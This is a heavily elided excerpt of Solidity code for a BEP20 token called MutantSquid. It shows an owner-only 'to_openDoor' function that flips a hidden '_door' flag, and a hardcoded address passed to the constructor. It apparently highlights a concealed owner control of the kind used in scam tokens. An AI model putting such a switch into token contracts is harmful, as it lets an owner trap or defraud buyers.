...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function to_openDoor(uint256 ) public onlyOwner {
        _door = 1;
...
contract MutantSquid is BEP20 {
    constructor() BEP20(
        ...
        [0x20c602101815AFb915374877383e0FEa6314ce8A,0x20c602101815AFb915374877383e0FEa6314ce8A]
    ){}
}